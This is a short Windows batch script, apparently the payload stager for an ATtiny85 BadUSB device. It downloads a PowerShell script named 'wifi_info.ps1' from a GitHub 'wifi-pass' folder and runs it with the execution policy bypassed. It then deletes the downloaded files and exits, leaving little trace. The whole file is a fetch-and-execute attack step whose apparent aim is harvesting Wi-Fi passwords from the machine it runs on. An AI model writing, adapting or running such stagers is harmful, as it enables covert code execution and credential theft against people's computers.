@echo off
:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_scripts
if not exist %tempDir% mkdir %tempDir%

:: Step 2: Download necessary files
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/wifi-pass/wifi_info.ps1' -OutFile '%tempDir%\wifi_info.ps1'"

:: Step 3: Change directory to the temporary folder
cd /d %tempDir%

:: Step 4: Execute the PowerShell script
powershell -ExecutionPolicy Bypass -File wifi_info.ps1

:: Step 5: Clean up - Delete all downloaded files and temporary directory
cd /d %temp%
rd /s /q %tempDir%

:: Step 6: Exit CMD
exit
